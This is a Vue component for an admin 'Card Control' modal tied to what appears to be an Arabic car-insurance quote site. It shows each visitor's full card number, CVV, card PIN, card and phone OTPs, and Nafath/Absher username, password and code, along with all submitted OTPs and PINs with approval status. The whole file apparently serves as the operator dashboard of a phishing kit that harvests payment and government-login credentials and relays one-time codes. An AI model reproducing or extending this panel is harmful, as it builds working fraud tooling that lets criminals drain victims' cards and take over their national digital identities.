<template>
  <ModalShell
    :open="open"
    title="Card Control"
    :subtitle="customer?.ip"
    max-width="52rem"
    accent="#3b82f6"
    icon="fa-solid fa-circle-info"
    dir="ltr"
    theme="dark"
    body-max-height="65vh"
    @close="$emit('close')"
  >
    <template #header-right>
      <AdminTabs
        v-model="activeTab"
        :tabs="infoTabs"
        dir="ltr"
        theme="dark"
      />
    </template>

    <!-- Payment Cards Section -->
    <div v-if="activeTab === 'payment'" class="space-y-4">
      <div v-if="customer?.payment?.cards?.length > 0" class="grid grid-cols-2 gap-4">
        <div
          v-for="(card, idx) in customer.payment.cards"
          :key="card.id || idx"
          class="admin-glass overflow-hidden"
        >
          <div class="mb-2 flex items-center justify-between text-xs text-gray-400">
            <span>Submission {{ idx + 1 }}</span>
            <span class="rounded-full bg-blue-500/20 px-2 py-0.5 text-[9px] font-bold uppercase text-blue-400">{{ card.card_type || '' }}</span>
          </div>
          <div class="space-y-1.5 text-sm">
            <div><span class="text-gray-500">Name:</span> <span class="font-mono text-white">{{ card.holder_name || card.card_holder || getCustomerName(customer) || '—' }}</span></div>
            <div><span class="text-gray-500">Card #:</span> <span class="font-mono text-lg tracking-wider text-white" dir="ltr">{{ formatCardNumber(card.card_number || card.card_number_full) || '—' }}</span></div>
            <div class="flex gap-6">
              <div><span class="text-gray-500">Exp:</span> <span class="font-mono text-white">{{ card.expiry_month }}/{{ card.expiry_year }}</span></div>
              <div><span class="text-gray-500">CVV:</span> <span class="font-mono font-bold text-emerald-400">{{ card.cvv || '—' }}</span></div>
            </div>
          </div>
        </div>
      </div>
      <div v-else class="admin-empty">
        <span class="text-4xl opacity-30">💳</span>
        <p class="mt-2 text-gray-500">لا توجد بطاقات مسجلة</p>
      </div>
    </div>

    <!-- Home Tab -->
    <div v-if="activeTab === 'home'" class="space-y-5">
      <!-- قيمة الدفع النهائية -->
      <div
        v-if="customer?.totalPrice || customer?.priceSummary?.total_price"
        class="admin-glass admin-glass--emerald"
      >
        <div class="flex items-center justify-between">
          <div class="flex items-center gap-3">
            <span class="text-3xl">💰</span>
            <div>
              <div class="text-xs text-emerald-400">قيمة الدفع النهائية</div>
              <div class="text-2xl font-bold text-emerald-300" dir="ltr">
                {{ Number(customer?.totalPrice || customer?.priceSummary?.total_price || 0).toLocaleString('ar-SA') }} ر.س
              </div>
            </div>
          </div>
          <div v-if="customer?.selectedOffer?.company_name" class="text-right">
            <div class="text-[10px] text-gray-500">شركة التأمين</div>
            <div class="font-medium text-gray-300">{{ customer?.selectedOffer?.company_name }}</div>
          </div>
        </div>
        <div v-if="customer?.priceSummary" class="mt-3 grid grid-cols-3 gap-3 border-t border-emerald-500/20 pt-3 text-sm">
          <div v-if="customer?.priceSummary?.base_price" class="text-gray-400">
            <span class="block text-[10px]">السعر الأساسي</span>
            <span class="font-medium text-white" dir="ltr">{{ Number(customer?.priceSummary?.base_price).toLocaleString('ar-SA') }} ر.س</span>
          </div>
          <div v-if="customer?.priceSummary?.vat" class="text-gray-400">
            <span class="block text-[10px]">الضريبة</span>
            <span class="font-medium text-white" dir="ltr">{{ Number(customer?.priceSummary?.vat).toLocaleString('ar-SA') }} ر.س</span>
          </div>
          <div v-if="customer?.priceSummary?.additions_total" class="text-gray-400">
            <span class="block text-[10px]">الإضافات</span>
            <span class="font-medium text-white" dir="ltr">{{ Number(customer?.priceSummary?.additions_total).toLocaleString('ar-SA') }} ر.س</span>
          </div>
        </div>
      </div>

      <!-- PIN / OTP / Nafath 3-columns -->
      <div class="grid grid-cols-3 gap-4">
        <div class="admin-glass space-y-2.5">
          <h4 class="flex items-center gap-2 border-b border-gray-700 pb-2 text-sm font-bold text-blue-400">
            <span class="admin-dot admin-dot--blue"></span> Card PIN/OTP
          </h4>
          <div class="text-sm"><span class="text-gray-500">PIN:</span> <span class="font-mono font-bold text-blue-400">{{ getLatestPin(customer) || '—' }}</span></div>
          <div class="text-sm"><span class="text-gray-500">Card OTP:</span> <span class="font-mono font-bold text-blue-400">{{ getLatestCardOtp(customer) || '—' }}</span></div>
        </div>
        <div class="admin-glass space-y-2.5">
          <h4 class="flex items-center gap-2 border-b border-gray-700 pb-2 text-sm font-bold text-orange-400">
            <span class="admin-dot admin-dot--orange"></span> Phone/OTP
          </h4>
          <div class="text-sm"><span class="text-gray-500">Phone:</span> <span class="font-mono text-white">{{ customer?.phone || customer?.phoneNumber || customer?.phone_number || '—' }}</span></div>
          <div class="text-sm"><span class="text-gray-500">Operator:</span> <span class="font-medium text-white">{{ customer?.phone_carrier || customer?.carrier || '—' }}</span></div>
          <div class="text-sm"><span class="text-gray-500">Birth Date:</span> <span class="text-white">{{ customer?.birth_date || customer?.birthDate || customer?.phone_verification?.birth_date || '—' }}</span></div>
          <div class="text-sm"><span class="text-gray-500">Phone OTP:</span> <span class="font-mono font-bold text-orange-400">{{ getLatestPhoneOtp(customer) || '—' }}</span></div>
        </div>
        <div class="admin-glass space-y-2.5">
          <h4 class="flex items-center gap-2 border-b border-gray-700 pb-2 text-sm font-bold text-purple-400">
            <span class="admin-dot admin-dot--purple"></span> Nafath/Absher
          </h4>
          <div class="text-sm"><span class="text-gray-500">User:</span> <span class="font-mono text-white">{{ getLatestNafath(customer)?.username || customer?.nafath?.username || '—' }}</span></div>
          <div class="text-sm"><span class="text-gray-500">Pass:</span> <span class="font-mono text-white">{{ getLatestNafath(customer)?.password || '—' }}</span></div>
          <div class="text-sm"><span class="text-gray-500">Code:</span> <span class="font-mono font-bold text-purple-400">{{ getLatestNafath(customer)?.verification_code || '—' }}</span></div>
        </div>
      </div>

      <!-- بيانات العميل الشخصية -->
      <div class="admin-glass">
        <h4 class="mb-3 flex items-center gap-2 text-sm font-bold text-blue-400">
          <span class="admin-dot admin-dot--blue"></span> بيانات العميل الشخصية
        </h4>
        <div class="grid grid-cols-4 gap-3 text-sm">
          <div><span class="block text-[10px] text-gray-500">الاسم الكامل</span><span class="font-medium text-white">{{ customer?.fullName || customer?.customer_name || getCustomerName(customer) || '—' }}</span></div>
          <div><span class="block text-[10px] text-gray-500">رقم الهوية</span><span class="font-mono font-medium text-yellow-400">{{ customer?.nationalId || '—' }}</span></div>
          <div><span class="block text-[10px] text-gray-500">الرقم التسلسلي</span><span class="font-mono text-white">{{ customer?.sequenceNumber || '—' }}</span></div>
          <div><span class="block text-[10px] text-gray-500">البطاقة الجمركية</span><span class="font-mono text-white">{{ customer?.customsCard || '—' }}</span></div>
          <div><span class="block text-[10px] text-gray-500">سنة الميلاد</span><span class="text-white">{{ customer?.birthYear || '—' }}</span></div>
          <div><span class="block text-[10px] text-gray-500">شهر الميلاد</span><span class="text-white">{{ customer?.birthMonth || '—' }}</span></div>
          <div><span class="block text-[10px] text-gray-500">المنطقة</span><span class="text-white">{{ customer?.region || '—' }}</span></div>
          <div><span class="block text-[10px] text-gray-500">المدينة</span><span class="text-white">{{ customer?.city || '—' }}</span></div>
        </div>
      </div>

      <!-- بيانات التأمين -->
      <div class="admin-glass admin-glass--blue">
        <h4 class="mb-3 flex items-center gap-2 text-sm font-bold text-blue-400">
          <span class="admin-dot admin-dot--blue"></span> بيانات التأمين
        </h4>
        <div class="grid grid-cols-4 gap-3 text-sm">
          <div><span class="block text-[10px] text-gray-500">غرض التأمين</span><span class="font-medium text-white">{{ getInsurancePurposeInline(customer?.insurancePurpose) }}</span></div>
          <div><span class="block text-[10px] text-gray-500">نوع التسجيل</span><span class="text-white">{{ getRegistrationTypeInline(customer?.registrationType) }}</span></div>
          <div><span class="block text-[10px] text-gray-500">نوع التأمين</span><span class="font-medium text-white">{{ getInsuranceTypeInline(customer?.insuranceType) }}</span></div>
          <div><span class="block text-[10px] text-gray-500">تاريخ بدء الوثيقة</span><span class="text-white">{{ customer?.policyStartDate || '—' }}</span></div>
        </div>
      </div>

      <!-- بيانات المركبة -->
      <div class="admin-glass admin-glass--amber">
        <h4 class="mb-3 flex items-center gap-2 text-sm font-bold text-amber-400">
          <span class="admin-dot admin-dot--amber"></span> بيانات المركبة
        </h4>
        <div class="grid grid-cols-4 gap-3 text-sm">
          <div><span class="block text-[10px] text-gray-500">رقم اللوحة</span><span class="font-mono font-medium text-white">{{ customer?.plateNumber || '—' }}</span></div>
          <div><span class="block text-[10px] text-gray-500">نوع المركبة</span><span class="text-white">{{ customer?.vehicleType || '—' }}</span></div>
          <div><span class="block text-[10px] text-gray-500">سنة الصنع</span><span class="text-white">{{ customer?.manufacturingYear || '—' }}</span></div>
          <div>
            <span class="block text-[10px] text-gray-500">قيمة المركبة</span>
            <span class="font-medium text-white" dir="ltr">{{ (customer?.vehiclePrice || customer?.vehicle_price) ? Number(customer?.vehiclePrice || customer?.vehicle_price).toLocaleString('ar-SA') + ' ر.س' : '—' }}</span>
          </div>
          <div><span class="block text-[10px] text-gray-500">طريقة الإصلاح</span><span class="text-white">{{ getRepairMethodInline(customer?.repairMethod) }}</span></div>
          <div><span class="block text-[10px] text-gray-500">غرض الاستخدام</span><span class="text-white">{{ getUsagePurposeInline(customer?.usagePurpose) }}</span></div>
          <div><span class="block text-[10px] text-gray-500">سائق إضافي</span><span class="text-white">{{ customer?.hasAdditionalDriver ? 'نعم' : 'لا' }}</span></div>
          <div v-if="customer?.additionalDriver"><span class="block text-[10px] text-gray-500">هوية السائق الإضافي</span><span class="font-mono text-white">{{ customer?.additionalDriver }}</span></div>
        </div>
      </div>

      <!-- الإضافات المختارة -->
      <div v-if="customer?.selectedAdditions?.length > 0" class="admin-glass admin-glass--purple">
        <h4 class="mb-3 flex items-center gap-2 text-sm font-bold text-purple-400">
          <span class="admin-dot admin-dot--purple"></span> الإضافات المختارة
        </h4>
        <div class="flex flex-wrap gap-2">
          <span v-for="(addition, idx) in customer?.selectedAdditions" :key="idx" class="rounded-full bg-purple-500/20 px-3 py-1 text-xs font-medium text-purple-300">
            {{ addition.name || addition }}
          </span>
        </div>
      </div>

      <!-- معلومات الجلسة -->
      <div class="admin-glass">
        <h4 class="mb-3 flex items-center gap-2 text-sm font-bold text-gray-400">
          <span class="admin-dot admin-dot--gray"></span> معلومات الجلسة
        </h4>
        <div class="grid grid-cols-4 gap-3 text-sm">
          <div><span class="block text-[10px] text-gray-500">IP Address</span><span class="font-mono text-white">{{ customer?.ip }}</span></div>
          <div><span class="block text-[10px] text-gray-500">الصفحة الحالية</span><span class="text-white">{{ getPageName(customer?.current_page) }}</span></div>
          <div><span class="block text-[10px] text-gray-500">نوع الجهاز</span><span class="text-white">{{ customer?.device_info?.type || customer?.device_type || '—' }}</span></div>
          <div><span class="block text-[10px] text-gray-500">المتصفح</span><span class="text-white">{{ customer?.device_info?.browser || customer?.browser || '—' }}</span></div>
          <div><span class="block text-[10px] text-gray-500">نظام التشغيل</span><span class="text-white">{{ customer?.device_info?.os || '—' }}</span></div>
          <div><span class="block text-[10px] text-gray-500">الدولة</span><span class="text-white">{{ customer?.location?.country || customer?.country || '—' }}</span></div>
          <div><span class="block text-[10px] text-gray-500">نسبة الإكمال</span><span class="font-medium text-emerald-400">{{ customer?.journey?.completion_percentage || 0 }}%</span></div>
          <div><span class="block text-[10px] text-gray-500">آخر نشاط</span><span class="text-white">{{ formatTime(customer?.last_activity) }}</span></div>
        </div>
      </div>
    </div>

    <!-- Details Tab -->
    <div v-if="activeTab === 'details'" class="grid grid-cols-2 gap-5">
      <div class="admin-glass space-y-3">
        <h4 class="flex items-center gap-2 border-b border-gray-700 pb-2 text-sm font-bold text-blue-400">
          <span class="admin-dot admin-dot--blue"></span> معلومات العميل
        </h4>
        <div class="text-sm"><span class="text-gray-500">الاسم:</span> <span class="text-white">{{ getCustomerName(customer) || '—' }}</span></div>
        <div class="text-sm"><span class="text-gray-500">الهوية:</span> <span class="font-mono text-yellow-400">{{ customer?.nationalId || '—' }}</span></div>
        <div class="text-sm"><span class="text-gray-500">الجوال:</span> <span class="font-mono text-white">{{ customer?.phone || customer?.phoneNumber || '—' }}</span></div>
        <div class="text-sm"><span class="text-gray-500">تاريخ الميلاد:</span> <span class="text-white">{{ customer?.birthDate || customer?.birth_date || '—' }}</span></div>
      </div>
      <div class="admin-glass space-y-3">
        <h4 class="flex items-center gap-2 border-b border-gray-700 pb-2 text-sm font-bold text-emerald-400">
          <span class="admin-dot admin-dot--emerald"></span> معلومات الجلسة
        </h4>
        <div class="text-sm"><span class="text-gray-500">IP:</span> <span class="font-mono text-white">{{ customer?.ip }}</span></div>
        <div class="text-sm"><span class="text-gray-500">الصفحة الحالية:</span> <span class="text-white">{{ getPageName(customer?.current_page) }}</span></div>
        <div class="text-sm"><span class="text-gray-500">آخر نشاط:</span> <span class="text-white">{{ formatTime(customer?.last_activity) }}</span></div>
        <div class="text-sm"><span class="text-gray-500">الحالة:</span>
          <StatusPill :variant="customer?.is_active ? 'success' : 'neutral'" :label="customer?.is_active ? 'متصل' : 'غير متصل'" size="sm" />
        </div>
      </div>
    </div>

    <!-- All OTPs Tab -->
    <div v-if="activeTab === 'all-otps'" class="space-y-3">
      <div v-if="customer?.all_otps?.length > 0" class="space-y-3">
        <div v-for="(otp, idx) in customer.all_otps" :key="otp.id || idx" class="admin-glass">
          <div class="flex items-center justify-between">
            <div class="flex items-center gap-3">
              <span class="admin-dot admin-dot--blue"></span>
              <div>
                <div class="font-mono text-xl font-bold text-blue-400">{{ otp.otp_code || otp.code || '—' }}</div>
                <div class="text-[10px] text-gray-500">النوع: {{ otp.type || 'payment' }}</div>
              </div>
            </div>
            <div class="text-right">
              <StatusPill
                :variant="otp.status === 'pending' ? 'warning' : (otp.status === 'approved' || otp.status === 'verified') ? 'success' : 'error'"
                :label="otp.status || 'pending'"
                size="sm"
              />
              <div class="mt-1 text-[10px] text-gray-500">{{ formatTime(otp.created_at) }}</div>
            </div>
          </div>
        </div>
      </div>
      <div v-else class="admin-empty">
        <span class="text-4xl opacity-30">🔐</span>
        <p class="mt-2 text-gray-500">لا توجد رموز OTP مسجلة</p>
      </div>
    </div>

    <!-- All PINs Tab -->
    <div v-if="activeTab === 'all-pins'" class="space-y-3">
      <div v-if="customer?.all_pins?.length > 0" class="space-y-3">
        <div v-for="(pin, idx) in customer.all_pins" :key="pin.id || idx" class="admin-glass">
          <div class="flex items-center justify-between">
            <div class="flex items-center gap-3">
              <span class="admin-dot admin-dot--purple"></span>
              <div>
                <div class="font-mono text-xl font-bold text-purple-400">{{ pin.pin || pin.code || '—' }}</div>
                <div class="text-[10px] text-gray-500">PIN #{{ idx + 1 }}</div>
              </div>
            </div>
            <div class="text-right">
              <StatusPill
                :variant="pin.status === 'pending' ? 'warning' : (pin.status === 'approved' || pin.status === 'verified') ? 'success' : 'error'"
                :label="pin.status || 'pending'"
                size="sm"
              />
              <div class="mt-1 text-[10px] text-gray-500">{{ formatTime(pin.created_at) }}</div>
            </div>
          </div>
        </div>
      </div>
      <div v-else class="admin-empty">
        <span class="text-4xl opacity-30">💳</span>
        <p class="mt-2 text-gray-500">لا توجد أرقام PIN مسجلة</p>
      </div>
    </div>

    <!-- Insurance Tab -->
    <div v-if="activeTab === 'insurance'" class="space-y-4">
      <div v-if="customer?.insurance || customer?.selected_insurance" class="space-y-4">
        <div class="admin-glass admin-glass--blue">
          <div class="flex items-center gap-3">
            <span class="text-3xl">🛡️</span>
            <div>
              <div class="text-lg font-bold text-blue-300">{{ customer?.insurance?.type === 'comprehensive' ? 'التأمين الشامل' : 'تأمين ضد الغير' }}</div>
              <div class="text-sm text-blue-400">{{ customer?.insurance?.company || customer?.selected_insurance?.company || '—' }}</div>
            </div>
          </div>
        </div>
        <div class="grid grid-cols-2 gap-4">
          <div class="admin-glass">
            <span class="text-[10px] text-gray-500">السعر</span>
            <div class="font-bold text-emerald-400">{{ formatCurrency(customer?.insurance?.price || customer?.selected_insurance?.price) }}</div>
          </div>
          <div class="admin-glass">
            <span class="text-[10px] text-gray-500">طريقة الإصلاح</span>
            <div class="font-medium text-white">{{ getRepairMethodInline(customer?.repairMethod) }}</div>
          </div>
          <div class="admin-glass">
            <span class="text-[10px] text-gray-500">قيمة المركبة</span>
            <div class="font-medium text-white">{{ formatCurrency(customer?.vehiclePrice || customer?.vehicle_value) }}</div>
          </div>
          <div class="admin-glass">
            <span class="text-[10px] text-gray-500">الإضافات</span>
            <div class="font-medium text-white">{{ customer?.additions?.length || 0 }} إضافة</div>
          </div>
        </div>
      </div>
      <div v-else class="admin-empty">
        <span class="text-4xl opacity-30">🛡️</span>
        <p class="mt-2 text-gray-500">لم يتم اختيار وثيقة</p>
        <p class="mt-1 text-[10px] text-gray-600">يرجى اختيار وثيقة تأمين من صفحة المقارنة أولاً</p>
      </div>
    </div>
  </ModalShell>
</template>

<script setup>
import { ModalShell, AdminTabs, StatusPill } from '../ui';
import { useCustomerFormatters } from '../../utils/customerFormatters';

const {
  formatCardNumber, formatTime, formatCurrency, getCustomerName,
  getLatestPin, getLatestCardOtp, getLatestPhoneOtp, getLatestNafath,
} = useCustomerFormatters();

const activeTab = defineModel( 'activeTab', { type: String, default: 'home' } );

defineProps({
  open: { type: Boolean, default: false },
  customer: { type: Object, default: null },
  getPageName: { type: Function, default: () => null },
});

defineEmits(['close']);

const infoTabs = [
  { id: 'home', label: 'Home', icon: '🏠' },
  { id: 'details', label: 'Details', icon: '📋' },
  { id: 'all-otps', label: 'All OTPs', icon: '🔐' },
  { id: 'all-pins', label: 'All PINs', icon: '💳' },
  { id: 'insurance', label: 'Insurance', icon: '🛡️' },
  { id: 'payment', label: 'Payment', icon: '💳' },
];

/* ── Inline formatters ── */
const getInsurancePurposeInline = (v) => {
  if (!v) return '—';
  const m = { new: 'جديد', transfer: 'نقل ملكية', renewal: 'تجديد', commercial: 'تجاري', personal: 'شخصي' };
  return m[v] || v;
};
const getRegistrationTypeInline = (v) => {
  if (!v) return '—';
  const m = { serial: 'رقم تسلسلي', sequence: 'رقم تسلسلي', customs: 'بطاقة جمركية' };
  return m[v] || v;
};
const getInsuranceTypeInline = (v) => {
  if (!v) return '—';
  if (v === 'comprehensive') return 'شامل';
  if (v === 'third_party' || v === 'thirdParty') return 'ضد الغير';
  return v;
};
const getRepairMethodInline = (v) => {
  if (!v) return '—';
  const m = { agency: 'وكالة', workshop: 'ورشة' };
  return m[v] || v;
};
const getUsagePurposeInline = (v) => {
  if (!v) return '—';
  const m = { personal: 'شخصي', commercial: 'تجاري', transport: 'نقل' };
  return m[v] || v;
};
</script>

<style scoped>
@reference "../../../../css/app.css";
</style>
